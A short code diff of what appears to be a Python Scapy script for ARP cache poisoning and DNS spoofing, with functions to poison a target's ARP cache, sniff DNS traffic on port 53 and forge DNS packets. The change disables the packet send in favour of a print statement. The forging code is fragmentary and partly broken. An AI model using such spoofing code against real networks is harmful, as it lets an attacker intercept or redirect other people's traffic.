@@ -12,12 +12,11 @@ def spoofarpcache(targetip, targetmac, sourceip):
 
 def sendFakeDNS(pkt):
     dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="61.13.148.37"))
-    send(dnsResPacket)
+    print("Une requete")
+    #•send(dnsResPacket)
 
 def DNSSpoofing(iptarget):
-   a = sniff(filter="udp and port 53", prn=sendFakeDNS)
-   a.nsummary()
-
+   sniff(filter="udp and port 53", prn=sendFakeDNS)
 
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
